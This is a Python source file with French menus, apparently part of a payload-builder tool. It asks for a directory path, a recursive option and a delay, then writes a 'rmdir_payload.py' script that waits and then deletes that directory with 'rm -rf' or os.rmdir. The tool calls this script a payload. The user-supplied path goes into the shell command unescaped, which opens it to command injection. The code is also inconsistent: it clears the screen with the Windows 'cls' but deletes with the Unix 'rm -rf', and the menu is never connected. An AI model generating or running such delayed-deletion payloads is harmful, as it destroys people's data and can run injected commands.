import os
from colorama import Fore, Style
def clear():
    os.system("cls")

def affichage():
    clear()
    print("=== Configuration Remove Directory ===\n\n")
    print("""
          
          Options : 

    1. Chemin du répertoire à supprimer
    2. Suppression récursive
    3. Délai avant suppression (en secondes)

          """)
    
def rmdir_module():
    clear()
    choix = {
        "Chemin du répertoire à supprimer": None,
        "Suppression récursive": None,
        "Délai avant suppression": None,
    }

    def chemin_option():
        clear()
        chemin = input("Entrez le chemin du répertoire à supprimer : ")
        choix["Chemin du répertoire à supprimer"] = chemin

    def recursive_option():
        clear()
        recursive = input("Suppression récursive ? (oui/non) : ")
        if recursive.lower() == "oui":
            choix["Suppression récursive"] = True
        else:
            choix["Suppression récursive"] = None

    def delai_option():
        clear()
        delai = input("Délai avant suppression en secondes : ")
        choix["Délai avant suppression"] = int(delai)

    options = [
        ("Chemin du répertoire à supprimer", chemin_option),    
        ("Suppression récursive", recursive_option),
        ("Délai avant suppression", delai_option),
    ]

    def create_payload():
        clear()
        print(Fore.GREEN + "Création du payload Remove Directory avec la configuration suivante :" + Style.RESET_ALL)
        filename = "rmdir_payload.py"
        with open(filename, "w") as f:
            f.write("import os\n")
            f.write("import time\n\n")
            f.write("def remove_directory():\n")
            if choix["Délai avant suppression"] is not None:
                f.write(f"    time.sleep({choix['Délai avant suppression']})\n")
            if choix["Suppression récursive"]:
                f.write(f"    os.system('rm -rf \"{choix['Chemin du répertoire à supprimer']}\"')\n")
            else:
                f.write(f"    os.rmdir('{choix['Chemin du répertoire à supprimer']}')\n\n")
            f.write("if __name__ == '__main__':\n")
            f.write("    remove_directory()\n")
        print(Fore.YELLOW + "\nPayload Remove Directory créé avec succès !" + Style.RESET_ALL)
